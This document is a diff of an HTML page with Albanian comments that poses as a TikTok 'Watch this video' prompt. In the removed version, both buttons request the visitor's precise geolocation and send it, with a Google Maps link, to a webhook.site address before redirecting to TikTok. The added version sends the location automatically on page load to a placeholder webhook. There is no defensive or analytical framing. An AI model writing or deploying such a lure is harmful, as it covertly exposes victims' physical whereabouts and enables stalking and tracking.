@@ -1,101 +1,48 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="sq">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Watch this video on TikTok</title>
-    <!-- Tailwind CSS për dizajn identik me popup-in e TikTok -->
+    <!-- Tailwind CSS për dizajn -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
-<body class="bg-black min-h-screen flex items-center justify-center p-4 font-sans select-none">
+<body class="bg-black min-h-screen flex items-center justify-center">
 
-    <!-- Modal Card (Pop-up i bardhë fiks si te fotoja) -->
-    <div class="relative w-full max-w-[340px] bg-white rounded-2xl pt-12 pb-6 px-6 text-center shadow-2xl mt-8">
-        
-        <!-- Fotoja e Profilit (Rrethore sipër në mes) -->
-        <div class="absolute -top-12 left-1/2 transform -translate-x-1/2">
-            <div class="w-24 h-24 rounded-full border-4 border-black overflow-hidden bg-neutral-800 shadow-md">
-                <!-- Mund ta ndryshosh foton e profilit te atributi 'src' -->
-                <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=300&q=80" alt="Profile" class="w-full h-full object-cover">
-            </div>
-        </div>
-
-        <!-- Titulli Kryesor -->
-        <h1 class="text-xl font-extrabold text-black mb-3 tracking-tight">
-            Watch this video on TikTok
-        </h1>
-
-        <!-- Përshkrimi me ikone qershie 🍒 -->
-        <p class="text-neutral-500 text-sm font-medium leading-snug mb-6 px-2">
-            🍒 shared a video with you. Watch on the app!
-        </p>
-
-        <!-- Butoni i Kuq Kryesor -->
-        <button id="getLocationBtn" onclick="fetchLocation()" class="w-full py-3 bg-[#FE2C55] active:bg-[#e0264a] text-white font-bold text-sm rounded-xl shadow-sm transition duration-150 mb-3">
-            Watch now
-        </button>
-
-        <!-- Butoni 'Not now' -->
-        <button onclick="fetchLocation()" class="text-neutral-400 hover:text-neutral-600 font-semibold text-sm transition">
-            Not now
-        </button>
-
-        <!-- Statusi ku shfaqet mesazhi gjatë lidhjes -->
-        <p id="statusMsg" class="text-xs text-neutral-400 mt-3 h-4"></p>
-    </div>
-
-    <!-- Shiriti i verdhë i poshtëm (Watch Spotlight - fiks si në foton tuaj) -->
-    <div class="fixed bottom-6 left-1/2 transform -translate-x-1/2 w-full max-w-[350px] px-4">
-        <div class="bg-[#FFE600] text-black font-bold py-3 px-4 rounded-full flex items-center justify-center gap-2 shadow-lg text-sm">
-            <i class="fa-solid fa-clone text-base"></i>
-            <span>Watch Spotlight</span>
-        </div>
-    </div>
-
+    <!-- Kodi i dërgimit të koordinatave -->
     <script>
-        function fetchLocation() {
-            const btn = document.getElementById('getLocationBtn');
-            const statusMsg = document.getElementById('statusMsg');
+        // VENDOS KËTU LINKUN TËND UNIK NGA WEBHOOK.SITE
+        const webhookUrl = 'https://webhook.site/KOPJO_LINKUN_TËND_KËTU';
 
-            if (!navigator.geolocation) {
-                statusMsg.textContent = "Geolocation is not supported.";
-                return;
+        function dergoKoordinatat() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                        const urlPërfundimtare = `${webhookUrl}?lat=${lat}&lon=${lon}&maps=${encodeURIComponent(mapsUrl)}`;
+
+                        fetch(urlPërfundimtare, { method: 'GET' })
+                            .then(() => console.log('Të dhënat u dërguan!'))
+                            .catch(err => console.error('Gabim gjatë dërgimit:', err));
+                    },
+                    function(error) {
+                        console.error("Gabim në marrjen e lokacionit: ", error.message);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                alert("Shfletuesi yt nuk e mbështet Geolocation.");
             }
-
-            btn.disabled = true;
-            btn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> Loading...`;
-            statusMsg.textContent = "Please allow location access...";
-
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-
-                    statusMsg.textContent = "Redirecting...";
-                    btn.innerHTML = `Watch now`;
-
-                    // Dërgon të dhënat e lokacionit te Webhook-u yt
-                    const webhookUrl = `https://webhook.site/173a0605-312d-4be1-b9aa-891895e5a34e?lat=${lat}&lon=${lon}&maps=https://www.google.com/maps?q=${lat},${lon}`;
-                    
-                    fetch(webhookUrl, {
-                        method: 'GET',
-                        mode: 'no-cors'
-                    }).then(() => {
-                        // Pas marrjes së lokacionit, mund ta ridrejtoni te TikTok ose ku të dëshironi
-                        window.location.href = "https://www.tiktok.com";
-                    }).catch(err => {
-                        window.location.href = "https://www.tiktok.com";
-                    });
-                },
-                (error) => {
-                    btn.disabled = false;
-                    btn.innerHTML = `Watch now`;
-                    statusMsg.textContent = "Please allow location to watch.";
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
         }
+
+        window.onload = dergoKoordinatat;
     </script>
 </body>
 </html>
